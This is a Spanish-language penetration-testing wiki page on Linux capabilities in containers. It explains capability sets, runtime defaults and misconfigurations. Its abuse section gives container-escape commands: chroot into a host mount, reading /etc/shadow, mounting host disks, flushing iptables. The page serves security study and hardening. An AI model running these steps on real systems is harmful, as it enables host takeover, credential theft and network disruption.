# Linux Capabilities En Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Descripción general

Las capabilities de Linux son uno de los elementos más importantes de la seguridad de los containers porque responden a una pregunta sutil pero fundamental: **¿qué significa realmente "root" dentro de un container?** En un sistema Linux normal, históricamente el UID 0 implicaba un conjunto de privilegios muy amplio. En los kernels modernos, ese privilegio se descompone en unidades más pequeñas llamadas capabilities. Un proceso puede ejecutarse como root y aun así carecer de muchas operaciones potentes si se han eliminado las capabilities correspondientes.

Los containers dependen mucho de esta distinción. Muchos workloads todavía se ejecutan como UID 0 dentro del container por razones de compatibilidad o simplicidad. Sin eliminar capabilities, esto sería demasiado peligroso. Al eliminarlas, un proceso root dentro de un container todavía puede realizar muchas tareas habituales dentro del container, mientras se le deniegan operaciones más sensibles del kernel. Por eso, que una shell de un container muestre `uid=0(root)` no significa automáticamente "host root" ni siquiera "privilegios amplios sobre el kernel". Los conjuntos de capabilities determinan cuánto vale realmente esa identidad root.

Para consultar la referencia completa de Linux capabilities y muchos ejemplos de abuso, consulta:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Operación

Las capabilities se registran en varios conjuntos, incluidos los conjuntos permitted, effective, inheritable, ambient y bounding. En muchas evaluaciones de containers, la semántica exacta del kernel de cada conjunto es menos importante de inmediato que la pregunta práctica final: **¿qué operaciones privilegiadas puede realizar correctamente este proceso ahora mismo y qué posibles aumentos de privilegios siguen siendo posibles en el futuro?**

Esto es importante porque muchas técnicas de breakout son, en realidad, problemas de capabilities disfrazados de problemas de containers. Un workload con `CAP_SYS_ADMIN` puede acceder a una enorme cantidad de funcionalidades del kernel que un proceso root normal de un container no debería tocar. Un workload con `CAP_NET_ADMIN` se vuelve mucho más peligroso si también comparte el network namespace del host. Un workload con `CAP_SYS_PTRACE` resulta mucho más interesante si puede ver procesos del host mediante el uso compartido del PID. En Docker o Podman esto puede aparecer como `--pid=host`; en Kubernetes normalmente aparece como `hostPID: true`.

En otras palabras, el conjunto de capabilities no se puede evaluar de forma aislada. Debe analizarse junto con los namespaces, seccomp y la política MAC.

## Laboratorio

Una forma muy directa de inspeccionar las capabilities dentro de un container es:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
También puedes comparar un contenedor más restrictivo con otro al que se le hayan añadido todas las capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Para ver el efecto de una adición limitada, prueba a eliminarlo todo y volver a añadir solo una capacidad:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Estos pequeños experimentos ayudan a demostrar que un runtime no se limita a activar o desactivar un booleano llamado "privileged". Está definiendo la superficie de privilegios real disponible para el proceso.

## Capacidades de alto riesgo

Aunque muchas capacidades pueden ser relevantes según el objetivo, algunas aparecen repetidamente en el análisis de escape de contenedores.

**`CAP_SYS_ADMIN`** es la que los defensores deberían tratar con mayor sospecha. A menudo se describe como "the new root" porque desbloquea una enorme cantidad de funcionalidades, incluidas operaciones relacionadas con mount, comportamientos sensibles a los namespaces y muchas rutas del kernel que nunca deberían exponerse a contenedores de forma casual. Si un contenedor tiene `CAP_SYS_ADMIN`, un seccomp débil y ninguna contención MAC sólida, muchas rutas clásicas de breakout se vuelven mucho más realistas.

**`CAP_SYS_PTRACE`** es importante cuando existe visibilidad de procesos, especialmente si el PID namespace se comparte con el host o con cargas de trabajo vecinas interesantes. Puede convertir la visibilidad en manipulación.

**`CAP_NET_ADMIN`** y **`CAP_NET_RAW`** son importantes en entornos centrados en la red. En una red bridge aislada ya pueden ser peligrosas; en un host network namespace compartido son mucho peores, porque la carga de trabajo podría reconfigurar la red del host, esnifar, suplantar o interferir con los flujos de tráfico locales.

**`CAP_SYS_MODULE`** suele ser catastrófica en un entorno rootful, porque cargar kernel modules equivale, en la práctica, a controlar el kernel del host. Casi nunca debería aparecer en una carga de trabajo de contenedor de propósito general.

## Uso en runtimes

Docker, Podman, stacks basados en containerd y CRI-O utilizan controles de capabilities, pero los valores predeterminados y las interfaces de gestión son diferentes. Docker los expone de forma muy directa mediante flags como `--cap-drop` y `--cap-add`. Podman ofrece controles similares y con frecuencia se beneficia de la ejecución rootless como capa de seguridad adicional. Kubernetes expone las adiciones y eliminaciones de capabilities mediante el `securityContext` del Pod o del contenedor. Los entornos de system containers, como LXC/Incus, también dependen del control de capabilities, pero la integración más amplia con el host de estos sistemas suele tentar a los operadores a relajar los valores predeterminados de forma más agresiva que en un entorno de app containers.

El mismo principio se aplica a todos ellos: que una capability se pueda conceder técnicamente no significa necesariamente que deba concederse. Muchos incidentes reales comienzan cuando un operador añade una capability simplemente porque una carga de trabajo falló con una configuración más estricta y el equipo necesitaba una solución rápida.

## Misconfiguraciones

El error más evidente es **`--cap-add=ALL`** en las CLIs de estilo Docker/Podman, pero no es el único. En la práctica, un problema más común es conceder una o dos capabilities extremadamente potentes, especialmente `CAP_SYS_ADMIN`, para "hacer que la aplicación funcione", sin comprender también las implicaciones de los namespaces, seccomp y mount. Otro fallo común es combinar capabilities adicionales con el uso compartido de namespaces del host. En Docker o Podman esto puede aparecer como `--pid=host`, `--network=host` o `--userns=host`; en Kubernetes, la exposición equivalente suele aparecer mediante opciones de la carga de trabajo como `hostPID: true` o `hostNetwork: true`. Cada una de estas combinaciones cambia lo que la capability puede afectar realmente.

También es común que los administradores crean que, como una carga de trabajo no es completamente `--privileged`, sigue estando limitada de forma significativa. A veces es cierto, pero en ocasiones la postura efectiva ya está lo bastante cerca de privileged como para que la distinción deje de importar operativamente.

## Abuso

El primer paso práctico consiste en enumerar el conjunto efectivo de capabilities y probar inmediatamente las acciones específicas de cada capability que serían relevantes para un escape o para acceder a información del host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Si `CAP_SYS_ADMIN` está presente, prueba primero el abuso basado en montajes y el acceso al sistema de archivos del host, porque es uno de los facilitadores de breakout más comunes:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Si `CAP_SYS_PTRACE` está presente y el contenedor puede ver procesos interesantes, verifica si la capability puede convertirse en inspección de procesos:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Si `CAP_NET_ADMIN` o `CAP_NET_RAW` están presentes, comprueba si la carga de trabajo puede manipular la pila de red visible o, al menos, recopilar información de red útil:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Cuando una prueba de capability tiene éxito, combínala con la situación de los namespaces. Una capability que parece simplemente riesgosa en un namespace aislado puede convertirse inmediatamente en un escape o en una primitiva de reconocimiento del host cuando el contenedor también comparte el PID del host, la red del host o los mounts del host.

### Ejemplo completo: `CAP_SYS_ADMIN` + mount del host = escape del host

Si el contenedor tiene `CAP_SYS_ADMIN` y un bind mount con permisos de escritura del sistema de archivos del host, como `/host`, la ruta de escape suele ser sencilla:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Si `chroot` tiene éxito, los comandos ahora se ejecutan en el contexto del sistema de archivos raíz del host:
```bash
id
hostname
cat /etc/shadow | head
```
Si `chroot` no está disponible, a menudo se puede lograr el mismo resultado llamando al binario a través del árbol montado:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Ejemplo completo: `CAP_SYS_ADMIN` + Acceso a dispositivos

Si se expone un dispositivo de bloques del host, `CAP_SYS_ADMIN` puede convertirlo en acceso directo al sistema de archivos del host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Ejemplo completo: `CAP_NET_ADMIN` + Networking del host

Esta combinación no siempre proporciona root del host directamente, pero puede reconfigurar por completo el network stack del host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Eso puede permitir una denegación de servicio, la intercepción del tráfico o el acceso a servicios que antes estaban filtrados.

## Comprobaciones

El objetivo de las comprobaciones de capabilities no es solo volcar valores sin procesar, sino comprender si el proceso tiene privilegios suficientes para que su namespace y su situación de mount actuales sean peligrosos.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Qué es interesante aquí:

- `capsh --print` es la forma más sencilla de detectar capabilities de alto riesgo como `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` o `cap_sys_module`.
- La línea `CapEff` en `/proc/self/status` indica qué capabilities son realmente efectivas ahora, no solo cuáles podrían estar disponibles en otros conjuntos.
- Un volcado de capabilities se vuelve mucho más importante si el contenedor también comparte los namespaces de PID, red o usuario del host, o tiene montajes del host con permisos de escritura.

Después de recopilar la información sin procesar sobre las capabilities, el siguiente paso es interpretarla. Hay que comprobar si el proceso es root, si los user namespaces están activos, si se comparten namespaces del host, si seccomp está aplicando restricciones y si AppArmor o SELinux todavía limitan el proceso. Un conjunto de capabilities por sí solo es solo una parte de la historia, pero a menudo es la parte que explica por qué un container breakout funciona y otro falla con el mismo punto de partida aparente.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Conjunto de capabilities reducido de forma predeterminada | Docker mantiene una allowlist predeterminada de capabilities y elimina el resto | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Conjunto de capabilities reducido de forma predeterminada | Los contenedores de Podman no tienen privilegios de forma predeterminada y usan un modelo de capabilities reducido | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hereda los valores predeterminados del runtime, salvo que se modifiquen | Si no se especifica ningún `securityContext.capabilities`, el contenedor obtiene el conjunto de capabilities predeterminado del runtime | `securityContext.capabilities.add`, no establecer `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O bajo Kubernetes | Normalmente, los valores predeterminados del runtime | El conjunto efectivo depende del runtime y de la especificación del Pod | igual que en la fila de Kubernetes; la configuración directa de OCI/CRI también puede añadir capabilities explícitamente |

En Kubernetes, el punto importante es que la API no define un único conjunto universal de capabilities predeterminado. Si el Pod no añade ni elimina capabilities, la carga de trabajo hereda el valor predeterminado del runtime de ese nodo.
{{#include ../../../../banners/hacktricks-training.md}}
